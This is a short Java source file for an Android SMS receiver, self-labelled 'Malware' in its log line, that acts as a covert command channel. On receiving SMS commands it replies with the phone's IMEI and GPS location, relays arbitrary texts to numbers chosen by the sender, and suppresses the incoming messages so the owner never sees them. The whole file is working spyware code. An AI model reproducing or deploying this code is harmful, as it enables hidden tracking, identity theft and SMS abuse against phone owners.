package listener;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

import routine.AndroidDeviceInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSTunnel extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Log.w("Malware", "[+] new SMS");

		final Bundle bundle = intent.getExtras();
		if (bundle == null)
			return;

		final Object[] pdus = (Object[]) bundle.get("pdus");
		SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdus[0]);

		// origin address
		String source = msg.getDisplayOriginatingAddress();
		// message text body
		String text = msg.getDisplayMessageBody();
		// CallBack Action
		callBackAction(source, text);
	}

	public void callBackAction(String source, String text) {
		Pattern ping = Pattern.compile("PING");
		Pattern imei = Pattern.compile("IMEI");
		Pattern gps = Pattern.compile("GPS");
		Pattern smsReplay = Pattern.compile(("SMS:(.*):(.*)"));

		Matcher mping = ping.matcher(text);
		Matcher mimei = imei.matcher(text);
		Matcher mgps = gps.matcher(text);
		Matcher msmsReplay = smsReplay.matcher(text);

		if (mping.matches()) {
			sendSMS(source, "PONG");
			abortBroadcast();
		} else if (mimei.matches()) {
			sendSMS(source, AndroidDeviceInfo.getImei());
			abortBroadcast();
		} else if (mgps.matches()) {
			sendSMS(source, AndroidDeviceInfo.getLatitude() + " "
					+ AndroidDeviceInfo.getLongitude());
			abortBroadcast();
		} else if (msmsReplay.matches()) {
			sendSMS(msmsReplay.group(1), msmsReplay.group(2));
			abortBroadcast();
		}
	}

	private void sendSMS(String dest, String text) {
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage(dest, null, text, null, null);
	}
}
